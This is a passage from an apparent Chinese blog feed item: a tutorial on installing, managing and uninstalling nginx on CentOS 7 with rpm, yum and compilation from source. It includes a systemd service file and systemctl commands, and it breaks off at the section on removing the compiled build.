&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Linux中软件安装与卸载</title><link>https://souljian.cn/p/746093969/</link><pubDate>Thu, 01 May 2025 18:06:09 +0800</pubDate><guid>https://souljian.cn/p/746093969/</guid><description>&lt;p>本文以nginx为例，介绍Linux中软件的安装与卸载方法。&lt;/p>
&lt;h2 id="一rpm安装包介绍与管理">一、rpm安装包介绍与管理
&lt;/h2>&lt;h3 id="一rpm的优点">（一）rpm的优点
&lt;/h3>&lt;ol>
&lt;li>安装软件非常方便。&lt;/li>
&lt;li>配套资源丰富。&lt;/li>
&lt;li>支持软件包内容校验。&lt;/li>
&lt;li>支持多种硬件。&lt;/li>
&lt;/ol>
&lt;h3 id="二rpm的功能">（二）rpm的功能
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>安装&lt;/strong>：将软件安装到操作系统。&lt;/li>
&lt;li>&lt;strong>卸载&lt;/strong>：将软件移除。&lt;/li>
&lt;li>&lt;strong>升级&lt;/strong>：更新软件的新版本。&lt;/li>
&lt;li>&lt;strong>查询&lt;/strong>：查询软件包的信息。&lt;/li>
&lt;li>&lt;strong>验证&lt;/strong>：验证操作系统中的软件是否为RPM包中的软件。&lt;/li>
&lt;/ol>
&lt;h3 id="三rpm的用法">（三）rpm的用法
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>查询所有RPM包的个数&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rpm -qa | wc -l&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>示例输出：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">444
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>查询是否安装了nginx软件&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rpm -qa | grep nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>下载nginx&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>下载地址：&lt;a class="link" href="http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/nginx-1.18.0-1.el7.x86_64.rpm" target="_blank" rel="noopener"
>http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/nginx-1.18.0-1.el7.x86_64.rpm&lt;/a>&lt;/li>
&lt;li>使用&lt;code>wget&lt;/code>下载：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># wget http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/nginx-1.18.0-1.el7.x86_64.rpm&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>安装nginx&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rpm -ivh nginx-1.18.0-1.el7.x86_64.rpm&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>选项说明：
&lt;ul>
&lt;li>&lt;code>-i&lt;/code>：安装&lt;/li>
&lt;li>&lt;code>-v&lt;/code>：显示详细信息&lt;/li>
&lt;li>&lt;code>-h&lt;/code>：显示安装进度&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>查询安装的nginx软件&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rpm -qa | grep nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>示例输出：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nginx-1.18.0-1.el7.x86_64
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>查询RPM包安装到操作系统的所有文件&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rpm -ql nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>示例输出：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/etc/nginx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/nginx/conf.d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/nginx/nginx.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/nginx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>卸载nginx&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># rpm -e nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="二yum安装管理与介绍">二、yum安装管理与介绍
&lt;/h2>&lt;h3 id="一yum简介">（一）yum简介
&lt;/h3>&lt;p>Yum 是基于 RPM 的软件包管理工具，它提供了 RPM 的仓库，并自动维护 RPM 之间的依赖关系。Yum 可以自动下载 RPM 包及其依赖项，资源丰富，主流 Linux 厂商均支持 Yum。&lt;/p>
&lt;h3 id="二yum安装nginx">（二）yum安装nginx
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>列出镜像源&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum repolist&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>查询RPM包&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum search nginx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum list | grep nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>安装RPM包&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum -y install nginx.x86_64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>卸载RPM包&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum remove nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>清除残留文件和配置&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># sudo yum autoremove&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>清除缓存&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># sudo yum clean all&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>查看yum历史记录&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum history&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum history info [id]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="三编译安装与卸载">三、编译安装与卸载
&lt;/h2>&lt;h3 id="一编译安装依赖">（一）编译安装依赖
&lt;/h3>&lt;p>在编译安装nginx之前，需要安装一些必要的开发工具和库：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># yum -y install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="二下载与解压源码">（二）下载与解压源码
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>下载nginx源码&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># wget http://nginx.org/download/nginx-1.18.0.tar.gz&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解压源码&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># tar -zxvf nginx-1.18.0.tar.gz&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="三编译安装步骤">（三）编译安装步骤
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>进入解压后的目录&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># cd nginx-1.18.0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>配置&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test nginx-1.18.0&lt;span class="o">]&lt;/span>&lt;span class="c1"># ./configure --prefix=/usr/local/nginx --with-http_ssl_module&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;code>--prefix&lt;/code>：指定安装目录&lt;/li>
&lt;li>&lt;code>--with-http_ssl_module&lt;/code>：启用SSL模块&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>编译&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test nginx-1.18.0&lt;span class="o">]&lt;/span>&lt;span class="c1"># make&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>安装&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test nginx-1.18.0&lt;span class="o">]&lt;/span>&lt;span class="c1"># make install&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="四服务管理">（四）服务管理
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>添加启动脚本&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>创建&lt;code>/etc/systemd/system/nginx.service&lt;/code>文件：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># vim /etc/systemd/system/nginx.service&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>内容如下：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-ini" data-lang="ini">&lt;span class="line">&lt;span class="cl">&lt;span class="k">[Unit]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">Description&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">nginx - high performance web server&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">Documentation&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">http://nginx.org/en/docs/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">After&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">network.target remote-fs.target nss-lookup.target&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">[Service]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">Type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">forking&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">PIDFile&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">/usr/local/nginx/logs/nginx.pid&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">ExecStart&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">ExecReload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">/usr/local/nginx/sbin/nginx -s reload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">ExecStop&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">/usr/local/nginx/sbin/nginx -s stop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">PrivateTmp&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">[Install]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">WantedBy&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">multi-user.target&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>启动及管理服务&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 启动nginx服务&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl start nginx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看nginx状态&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl status nginx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 设置开机自启&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl enable nginx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 停止服务&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl stop nginx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 重新加载配置&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@centos7-test ~&lt;span class="o">]&lt;/span>&lt;span class="c1"># systemctl reload nginx&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>卸载编译安装的nginx&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
